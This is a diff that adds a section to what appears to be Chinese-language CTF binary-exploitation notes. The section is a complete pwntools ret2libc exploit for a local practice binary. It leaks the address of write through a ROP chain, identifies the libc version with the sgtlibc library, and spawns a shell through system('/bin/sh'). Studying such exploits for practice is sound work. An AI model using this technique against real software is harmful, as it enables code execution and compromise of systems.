@@ -437,6 +437,40 @@ io.sendline(payload2)
 io.interactive()
 ```
 
+#### 无libc文件的ret2libc
+
+```python
+from pwn import *
+import pdb
+import sgtlibc
+context(os='linux',arch='amd64',log_level='debug')
+elf = ELF("./pwn")
+io = process("./pwn")
+main_adr = elf.symbols["main"]
+write_got = elf.got["write"]
+write_plt = elf.plt["write"]
+pop_rdi = 0x4006b3
+pop_rsi_r15 = 0x4006b1
+payload1 = b's'*136 + p64(pop_rdi) + p64(1) + p64(pop_rsi_r15) + p64(write_got) + p64(0) + p64(write_plt) + p64(main_adr)
+
+io.recvuntil(b":")
+io.sendline(payload1)
+io.recvline()
+write_call = u64(io.recv(6).ljust(8,b"\x00")) #接受6个数据，并按照8个一组进行填充，最后解包
+
+print(hex(write_call))
+libc = sgtlibc.Searcher()   #定义查找对象
+libc.add_condition('write', write_call) #添加查找条件
+libc.dump(db_index=2) #从0开始尝试所有版本
+shell_call = libc.get_address(sgtlibc.s_binsh) #自动计算地址
+sys_call = libc.get_address(sgtlibc.s_system) #自动计算地址
+payload2 = b's'*136 + p64(pop_rdi) + p64(shell_call) + p64(sys_call)
+
+io.recvuntil(b":")
+io.sendline(payload2)
+io.interactive()
+```
+
 
 
 ## ORW
